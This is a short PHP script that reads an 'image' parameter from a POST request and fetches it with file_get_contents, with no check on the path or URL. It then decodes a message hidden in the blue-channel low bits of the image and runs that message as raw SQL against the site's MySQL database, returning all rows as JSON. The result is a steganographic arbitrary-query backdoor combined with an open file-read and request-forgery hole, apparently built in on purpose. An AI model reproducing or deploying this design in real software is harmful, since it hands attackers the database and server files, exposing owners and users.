<?php
include("config.php");
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST["image"])) {
        $imageName = $_POST["image"];
        $imageData = file_get_contents($imageName);
        process_image($imageData);
    } else {
        http_response_code(400);
        echo "Error: Missing image parameter";
    }
}
else {
    http_response_code(405);
}


function process_image($imageData)
{
    $image = imagecreatefromstring($imageData);
    if (!$image) {
        http_response_code(400);
        die("Error: Invalid image format");
    }
    $width = imagesx($image);
    $height = imagesy($image);
    if ($width !== 128 || $height !== 128) {
        http_response_code(400);
        die("Error: Wrong image width/height");
    }
    $query = "";
    $char = "";
    $i = 0;
    for ($y = 0; $y < $height; $y++) {
        for ($x = 0; $x < $width; $x++) {
            $rgb = imagecolorat($image, $x, $y);
            $blue = ($rgb >> 0) & 0xFF;
            $char .= ($blue & 1);
            $i++;
            if ($i % 8 == 0) {
                $query .= chr(bindec($char));
                $char = "";
            }
            if (substr($query, -1) == ";") {
                execute_query(substr($query, 0, -1));
                return;
            }
        }
    }
    http_response_code(400);
    die("Error: SQL query not found in image");
}

function execute_query($query)
{
    $conn = mysqli_connect(DB_SERVER, DB_USER, DB_PASSWORD, DB_DATABASE);

    if (!$conn) {
        http_response_code(400);
        die("Connection failed: " . mysqli_connect_error());
    }

    $result = mysqli_query($conn, $query);

    if (!$result) {
        http_response_code(400);
        die("Error while executing the query");
    }


    $data = array();
    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    mysqli_close($conn);

    header("Content-Type: application/json");
    echo json_encode($data);
}